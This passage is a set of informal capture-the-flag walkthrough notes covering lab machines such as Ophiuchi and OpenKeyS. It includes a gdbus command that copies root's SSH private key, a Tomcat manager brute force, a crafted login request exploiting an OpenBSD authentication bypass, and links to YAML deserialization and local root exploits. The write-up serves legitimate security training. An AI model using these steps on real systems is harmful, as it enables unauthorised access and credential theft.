    when we run our python exploit so we get some hashes so when we crack them so we get some password in the box we have a user paul so we try to sudo - paul and we get in.
    
    inside the box we get a .ssh folder where we get  a id_rsa key so we ssh it with user ‚Äònadav‚Äô and we get in.
    
    now in nadav we see a usb creator so we search a exploit for it and we get :
    
    gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /dev/shm/rootkey true
    
    now go to /dev/shm where we find the ssh key of root.
    
    ssh to root and now we are in the root‚Äôs shell.
    
- Ophiuchi (bruteforce tomcat using msfconsole, YAML, wasm)
    
    In this we have a web page which is based in tomcat so we go to /manager/ and try to use the default creds for it i.e. tomcat:tomcat but so won't get in.
    
    so we go to msfconsole and search for tomcat and there we find the tomcat manager bruteforce at no. 23 so we set 23 and in this we set user passfile to ‚Üí /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt(in text file replace : to space)
    
    and unset user_file and pass_file and also set bruteforce speed to 1.
    
    but there is no successful result here.
    
    so we go to github ‚Üí https://github.com/artsploit/yaml-payload
    
    and we copy the code and try to get a shell but for more info refer the video ‚Üí [https://youtu.be/9-AQQkJA1X4?t=566](https://youtu.be/9-AQQkJA1X4?t=566)
    
    now after getting a shell so we inside the shell and under /opt/tomcat we got a password: whythereisalimit
    
    now under /manager/ we do admin:whythereisalimit and we get in.
    
    and it is also ssh password.
    
    for wasm please watch video ‚Üí [https://youtu.be/9-AQQkJA1X4?t=1783](https://youtu.be/9-AQQkJA1X4?t=1783)
    
- OpenKeyS (Recover php file using vim, Openbsd Local Privilege Escalation)
    
    In this we have a simple login page and we go to /include directory and wget both the file.
    
    open vim and type command recover auth.php.swp and we can now read the php file.
    
    and when we exiftool the same file we get a user name.
    
    now in the burpsuite modify the request by:
    
    ```
    POST /index.php HTTP/1.1
    Host: 10.129.151.211
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0

    Content-Length: 35
    
    username=-schallenge&password=admin
    ```
    
    now after follow redirection we get a key.
    
    now ssh on the box using Jennifer user and we use this exploit: [https://github.com/bcoles/local-exploits/blob/master/CVE-2019-19520/openbsd-authroot](https://github.com/bcoles/local-exploits/blob/master/CVE-2019-19520/openbsd-authroot)
    
    we copy the payload and chmod +x  and ./ run it and we get the password and after that we are root.
